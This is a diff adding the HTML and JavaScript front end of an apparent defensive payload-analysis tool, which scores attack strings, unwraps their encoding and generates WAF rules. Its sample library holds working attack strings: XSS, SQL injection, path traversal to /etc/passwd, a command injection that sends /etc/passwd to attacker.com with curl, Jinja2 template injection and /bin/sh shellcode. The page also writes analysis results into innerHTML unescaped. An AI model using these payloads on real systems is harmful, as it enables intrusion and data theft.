@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Payload & Entropy Studio | Security Intelligence</title>
+  <style>
+    :root {
+      --g-blue: #1a73e8;
+      --g-blue-dark: #1557b0;
+      --g-blue-light: #e8f0fe;
+      --g-green: #1e8e3e;
+      --g-green-light: #e6f4ea;
+      --g-yellow: #f9ab00;
+      --g-yellow-light: #fef7e0;
+      --g-red: #d93025;
+      --g-red-light: #fce8e6;
+      --surface: #ffffff;
+      --surface-variant: #f8f9fa;
+      --border: #dadce0;
+      --border-subtle: #e8eaed;
+      --text: #202124;
+      --text-secondary: #5f6368;
+      --code-bg: #f1f3f4;
+      --shadow-sm: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+      --shadow-md: 0 4px 8px 3px rgba(60,64,67,0.15);
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-full: 9999px;
+    }
+    [data-theme="dark"] {
+      --surface: #1e1f20;
+      --surface-variant: #131314;
+      --border: #3c4043;
+      --border-subtle: #2d3134;
+      --text: #e3e3e3;
+      --text-secondary: #9aa0a6;
+      --g-blue-light: #1c3b5e;
+      --g-green-light: #133820;
+      --g-red-light: #3c1e1e;
+      --code-bg: #282a2c;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Google Sans", "Segoe UI", Roboto, sans-serif;
+      background: var(--surface-variant);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      overflow: hidden;
+    }
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0.75rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+      z-index: 10;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 1.15rem;
+      font-weight: 600;
+    }
+    .brand-icon {
+      background: var(--g-blue);
+      color: white;
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+    }
+    .badge {
+      background: var(--g-blue-light);
+      color: var(--g-blue);
+      padding: 0.2rem 0.6rem;
+      border-radius: var(--radius-full);
+      font-size: 0.75rem;
+      font-weight: 500;
+    }
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .btn-icon {
+      background: none;
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 0.4rem 0.75rem;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-size: 0.85rem;
+    }
+    .container {
+      display: grid;
+      grid-template-columns: 320px 1fr;
+      flex: 1;
+      overflow: hidden;
+    }
+    aside {
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      padding: 1.25rem;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+    .section-title {
+      font-size: 0.85rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-secondary);
+      margin-bottom: 0.5rem;
+    }
+    .sample-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0.4rem;
+    }
+    .sample-item {
+      padding: 0.6rem 0.75rem;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border-subtle);
+      background: var(--surface-variant);
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+    .sample-item:hover {
+      border-color: var(--g-blue);
+      background: var(--g-blue-light);
+    }
+    .sample-name {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+    .sample-desc {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+    }
+    main {
+      padding: 1.5rem;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 1.25rem;
+      box-shadow: var(--shadow-sm);
+    }
+    textarea {
+      width: 100%;
+      padding: 0.65rem 0.75rem;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      background: var(--surface);
+      color: var(--text);
+      font-family: monospace;
+      font-size: 0.9rem;
+      resize: vertical;
+    }
+    .threat-banner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-sm);
+      margin-top: 0.75rem;
+    }
+    .threat-banner.CRITICAL, .threat-banner.HIGH { background: var(--g-red-light); color: var(--g-red); border: 1px solid var(--g-red); }
+    .threat-banner.MEDIUM, .threat-banner.LOW { background: var(--g-yellow-light); color: #b06000; border: 1px solid var(--g-yellow); }
+    .threat-banner.INFO { background: var(--g-green-light); color: var(--g-green); border: 1px solid var(--g-green); }
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 1rem;
+    }
+    .tab {
+      padding: 0.5rem 1rem;
+      cursor: pointer;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      border-bottom: 2px solid transparent;
+    }
+    .tab.active {
+      color: var(--g-blue);
+      border-bottom-color: var(--g-blue);
+      font-weight: 600;
+    }
+    canvas {
+      width: 100%;
+      height: 100px;
+      background: #000;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+    }
+    pre {
+      background: var(--code-bg);
+      padding: 1rem;
+      border-radius: var(--radius-sm);
+      overflow-x: auto;
+      font-family: monospace;
+      font-size: 0.85rem;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand">
+      <div class="brand-icon">🛡️</div>
+      <span>Google Payload & Entropy Studio</span>
+      <span class="badge">Security Threat Intelligence</span>
+    </div>
+    <div class="header-actions">
+      <button class="btn-icon" onclick="toggleTheme()">🌓 Theme</button>
+      <button class="btn-icon" onclick="copyWafRule()">📋 Copy WAF Rule</button>
+    </div>
+  </header>
+
+  <div class="container">
+    <aside>
+      <div class="section-title">Attack Vector Library</div>
+      <div class="sample-list">
+        <div class="sample-item" onclick="loadSample('xss')">
+          <div class="sample-name">Obfuscated XSS</div>
+          <div class="sample-desc">URL-encoded event execution</div>
+        </div>
+        <div class="sample-item" onclick="loadSample('sqli')">
+          <div class="sample-name">SQLi Union & Time Blind</div>
+          <div class="sample-desc">Tautology + SLEEP benchmark</div>
+        </div>
+        <div class="sample-item" onclick="loadSample('lfi')">
+          <div class="sample-name">Multi-Layer LFI Traversal</div>
+          <div class="sample-desc">Double URL-encoded /etc/passwd</div>
+        </div>
+        <div class="sample-item" onclick="loadSample('cmd')">
+          <div class="sample-name">Command Injection</div>
+          <div class="sample-desc">Subshell pipe & curl exfil</div>
+        </div>
+        <div class="sample-item" onclick="loadSample('ssti')">
+          <div class="sample-name">SSTI Template Injection</div>
+          <div class="sample-desc">Jinja2 class mro traversal</div>
+        </div>
+        <div class="sample-item" onclick="loadSample('shellcode')">
+          <div class="sample-name">High-Entropy Shellcode</div>
+          <div class="sample-desc">Packed raw binary bytes</div>
+        </div>
+      </div>
+
+      <div class="section-title" style="margin-top:1rem;">Entropy Heatmap</div>
+      <canvas id="entropy-canvas" width="300" height="100"></canvas>
+    </aside>
+
+    <main>
+      <!-- Input Card -->
+      <div class="card">
+        <div class="section-title">Suspicious Attack Payload</div>
+        <textarea id="payload-input" rows="3" oninput="runFullAnalysis()">%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</textarea>
+        <div id="threat-container"></div>
+      </div>
+
+      <!-- Analysis Tabs -->
+      <div class="card">
+        <div class="tabs">
+          <div class="tab active" onclick="switchTab('threat')">Threat Breakdown</div>
+          <div class="tab" onclick="switchTab('deobf')">De-obfuscation Layers</div>
+          <div class="tab" onclick="switchTab('entropy')">Entropy & Complexity</div>
+          <div class="tab" onclick="switchTab('waf')">WAF Rule Generator</div>
+        </div>
+
+        <!-- Tab 1: Threat Breakdown -->
+        <div id="tab-threat">
+          <div id="threat-details"></div>
+        </div>
+
+        <!-- Tab 2: Deobfuscation -->
+        <div id="tab-deobf" style="display:none;">
+          <div id="deobf-details"></div>
+        </div>
+
+        <!-- Tab 3: Entropy -->
+        <div id="tab-entropy" style="display:none;">
+          <div id="entropy-details"></div>
+        </div>
+
+        <!-- Tab 4: WAF -->
+        <div id="tab-waf" style="display:none;">
+          <div style="display:flex; gap:0.5rem; margin-bottom:0.75rem;">
+            <button class="btn-icon" onclick="showWaf('modsecurity')">ModSecurity</button>
+            <button class="btn-icon" onclick="showWaf('cloudflare')">Cloudflare WAF</button>
+            <button class="btn-icon" onclick="showWaf('aws_waf')">AWS WAF v2</button>
+            <button class="btn-icon" onclick="showWaf('suricata')">Suricata IDS</button>
+          </div>
+          <pre id="waf-rule-box"></pre>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <script>
+    const samples = {
+      xss: '%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
+      sqli: "1' UNION SELECT 1,username,password FROM users WHERE '1'='1' AND SLEEP(5)--",
+      lfi: '%252e%252e%252f%252e%252e%252fetc%2fpasswd',
+      cmd: '; cat /etc/passwd | curl -X POST https://attacker.com/leak',
+      ssti: '{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("id").read()}}',
+      shellcode: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
+    };
+
+    let currentWafRules = {};
+    let activeWaf = 'modsecurity';
+
+    function toggleTheme() {
+      const current = document.body.getAttribute('data-theme');
+      document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
+    }
+
+    function switchTab(t) {
+      document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+      event.target.classList.add('active');
+      document.getElementById('tab-threat').style.display = t === 'threat' ? 'block' : 'none';
+      document.getElementById('tab-deobf').style.display = t === 'deobf' ? 'block' : 'none';
+      document.getElementById('tab-entropy').style.display = t === 'entropy' ? 'block' : 'none';
+      document.getElementById('tab-waf').style.display = t === 'waf' ? 'block' : 'none';
+    }
+
+    function loadSample(k) {
+      document.getElementById('payload-input').value = samples[k];
+      runFullAnalysis();
+    }
+
+    async function runFullAnalysis() {
+      const payload = document.getElementById('payload-input').value;
+
+      // 1. Analyze Threat
+      const resp = await fetch('/api/analyze', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({payload})
+      });
+      const data = await resp.json();
+
+      // Threat Banner
+      document.getElementById('threat-container').innerHTML = `
+        <div class="threat-banner ${data.severity}">
+          <div>
+            <strong>${data.primary_threat}</strong> (${data.cwe_mappings.join(', ') || 'No CWE'})
+            <div style="font-size:0.85rem; margin-top:2px;">Risk Score: ${data.risk_score}/100 | Severity: ${data.severity}</div>
+          </div>
+          <div style="font-size:1.1rem; font-weight:700;">${data.risk_score}%</div>
+        </div>
+      `;
+
+      // Threat Tab
+      document.getElementById('threat-details').innerHTML = `
+        <p><strong>Primary Classification:</strong> ${data.primary_threat}</p>
+        <p><strong>MITRE ATT&CK Techniques:</strong> ${data.mitre_attack_mappings.join(', ') || 'None'}</p>
+        <p><strong>Deobfuscated Form:</strong> <code>${data.normalized_payload}</code></p>
+        <h4 style="margin-top:1rem; margin-bottom:0.5rem;">Matched Signatures (${data.matched_rules.length}):</h4>
+        ${data.matched_rules.map(r => `<div style="background:var(--code-bg); padding:0.5rem; border-radius:6px; margin-bottom:4px; font-size:0.85rem;">[${r.category}] ${r.description} (CWE: ${r.cwe})</div>`).join('')}
+      `;
+
+      // Deobf Tab
+      document.getElementById('deobf-details').innerHTML = `
+        <p><strong>Total Unmasking Layers:</strong> ${data.deobfuscation.total_layers_unwrapped}</p>
+        <p><strong>Applied Transforms:</strong> ${data.deobfuscation.transforms_applied.join(' -> ') || 'None'}</p>
+        ${data.deobfuscation.steps.map(s => `<div style="background:var(--code-bg); padding:0.5rem; border-radius:6px; margin-top:6px; font-size:0.85rem;"><strong>Layer ${s.layer}: ${s.transform}</strong><br>${s.description}<br><code>${s.output_preview}</code></div>`).join('')}
+      `;
+
+      // Entropy Tab
+      document.getElementById('entropy-details').innerHTML = `
+        <p><strong>Shannon Entropy:</strong> ${data.entropy.shannon_entropy} bits/byte (${data.entropy.classification})</p>
+        <p><strong>Kolmogorov Compression Ratio:</strong> ${data.entropy.compression_ratio}</p>
+        <p><strong>Printable Characters:</strong> ${data.entropy.char_classes.printable_pct}% | <strong>Special Chars:</strong> ${data.entropy.char_classes.special_pct}%</p>
+      `;
+
+      drawEntropy(data.entropy.shannon_entropy);
+
+      // 2. Fetch WAF rules
+      const wafResp = await fetch('/api/waf', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({payload})
+      });
+      const wafData = await wafResp.json();
+      currentWafRules = wafData.rules;
+      showWaf(activeWaf);
+    }
+
+    function showWaf(w) {
+      activeWaf = w;
+      document.getElementById('waf-rule-box').innerText = currentWafRules[w] || '';
+    }
+
+    function copyWafRule() {
+      const code = currentWafRules[activeWaf] || '';
+      navigator.clipboard.writeText(code);
+      alert('WAF rule copied to clipboard!');
+    }
+
+    function drawEntropy(entropy) {
+      const canvas = document.getElementById('entropy-canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      const ratio = Math.min(1.0, entropy / 8.0);
+      const color = ratio > 0.75 ? '#d93025' : (ratio > 0.5 ? '#f9ab00' : '#1e8e3e');
+
+      ctx.fillStyle = color;
+      ctx.fillRect(10, 40, (canvas.width - 20) * ratio, 20);
+
+      ctx.fillStyle = '#fff';
+      ctx.font = '12px monospace';
+      ctx.fillText(`Entropy: ${entropy.toFixed(3)} / 8.000 bits`, 10, 25);
+    }
+
+    runFullAnalysis();
+  </script>
+</body>
+</html>
